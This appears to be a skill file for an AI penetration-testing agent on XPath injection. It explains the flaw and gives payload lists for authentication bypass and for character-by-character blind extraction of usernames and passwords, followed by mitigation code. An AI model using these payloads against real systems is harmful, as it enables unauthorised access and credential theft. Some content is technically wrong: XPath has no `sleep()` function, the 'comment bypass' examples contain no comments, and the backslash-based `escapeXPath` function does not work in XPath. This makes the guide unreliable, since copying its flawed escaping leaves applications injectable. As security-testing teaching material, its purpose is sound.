---
name: xpath-injection-testing
description: Professional skills and methodology for XPath injection testing
version: 1.0.0
---

# XPath Injection Testing

## Overview

XPath injection exploits flaws in query construction, similar to SQL injection, and may cause information disclosure or authentication bypass. This skill covers detection, exploitation, and prevention.

## How the Vulnerability Works

When an application concatenates user input into XPath queries without adequate validation and filtering, attackers can alter query logic.

**Unsafe code example:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPath Basics

### Query Syntax

**Basic queries:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Functions

**Common functions:**
- `text()` - Retrieve text content
- `count()` - Count nodes
- `substring()` - Extract a substring
- `string-length()` - Get string length
- `contains()` - Check containment

## Testing Methods

### 1. Identify XPath Input Points

**Common features:**
- User login
- Data search
- XML data queries
- Configuration queries

### 2. Basic Detection

**Test special characters:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Test logical operators:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: admin' or '1'='1
Password: anything
Query: //user[username='admin' or '1'='1' and password='anything']
```

**More precise bypass:**
```
Username: admin') or ('1'='1
Query: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Information Disclosure

**Enumerate users:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Get the node count:**
```
' or count(//user)>0 or '
```

**Retrieve specific nodes:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logic bypass**
```
Input: admin' or '1'='1
Query: //user[username='admin' or '1'='1' and password='*']
Result: Matches all users
```

**Method 2: Comment bypass**
```
Input: admin')] | //* | //*[('
Query: //user[username='admin')] | //* | //*[('' and password='*']
```

**Method 3: Boolean-based blind injection**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Information Disclosure

**Enumerate all users:**
```
' or 1=1 or '
Result: Returns all user nodes
```

**Retrieve usernames:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Retrieve one character at a time
```

**Retrieve passwords:**
```
' or substring(//user[1]/password,1,1)='p' or '
Retrieve password characters one at a time
```

### Blind Injection Techniques

**Time-based blind injection:**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**Boolean-based blind injection:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observe response differences
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**HTML entity encoding:**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### Comment Bypass

**Using comments:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Function-Based Bypass

**Use different functions:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Tools

### XPath Expression Testing

**Online tools:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Intercept an XPath query request
2. Modify query parameters
3. Observe the response

### Python Script

```python
from lxml import etree
from lxml.etree import XPath

# Load the XML document
doc = etree.parse('users.xml')

# Test injection
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Verification and Reporting

### Verification Steps

1. Confirm control over XPath queries
2. Verify authentication bypass or information disclosure
3. Assess impact (unauthorized access, data disclosure, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and input parameters
- XPath query construction method
- Complete exploitation steps and PoC
- Remediation guidance (input validation, parameterized queries, etc.)

## Mitigations

### Recommended Approach

1. **Input validation**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS = 
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
   
   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use XPath variables
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **Allowlist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Use precompiled queries**
   ```java
   // Predefined query template
   private static final String LOGIN_QUERY = 
       "//user[username=$1 and password=$2]";
   
   // Use parameter binding
   ```

5. **Least privilege**
   - Restrict XPath query scope
   - Use access controls
   - Restrict queryable nodes

## Considerations

- Test only in authorized environments
- Account for syntax differences between XPath versions
- Avoid disrupting XML data during testing
- Understand the target application's XPath implementation